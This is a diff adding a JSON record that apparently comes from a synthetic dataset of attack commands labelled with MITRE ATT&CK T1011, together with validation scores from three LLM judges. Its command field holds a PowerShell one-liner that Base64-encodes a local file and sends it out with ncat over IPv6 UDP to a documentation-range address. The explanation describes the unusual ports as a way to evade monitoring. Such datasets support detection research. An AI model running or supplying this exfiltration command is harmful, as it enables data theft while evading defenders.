@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+  "explanation": "Exfiltrates over IPv6 UDP using an uncommon fixed source and destination port to avoid typical monitored services. This leverages an alternative medium/protocol from usual C2 channels, consistent with T1011.",
+  "rationale_steps": [
+    "Base64-encode content to blend payload bytes.",
+    "Send via IPv6 UDP with unusual source/destination ports to separate from common traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-40a7ef4f",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell syntax is correct with balanced quotes and a valid pipeline, but Ncat’s --send-only option is placed after host/port (options typically must precede them), which may cause an argument parsing error.",
+        "semantic_score": 3,
+        "semantic_justification": "It reads and Base64-encodes a file and sends it via IPv6 UDP with a fixed source port, aligning with exfiltration behavior, but it uses a documentation-only IPv6 address and maps better to alternative protocol than to a different network medium per T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:40:34.366857Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, correct method calls, and valid ncat parameters with appropriate flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by reading a file, base64 encoding it, and exfiltrating over IPv6 UDP using uncommon ports (60999 source, 57777 destination) which represents an alternative network medium from typical monitored channels.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:40:39.800735Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, file reading, Base64 conversion, and proper `ncat.exe` flags and arguments.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command effectively exfiltrates data via IPv6 UDP on uncommon ports, its alignment with T1011's 'Exfiltration Over Other Network Medium' is weak, as T1011 primarily refers to physically distinct network paths like cellular or Bluetooth, not merely a different protocol over the same primary network interface.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T06:15:41.589485Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
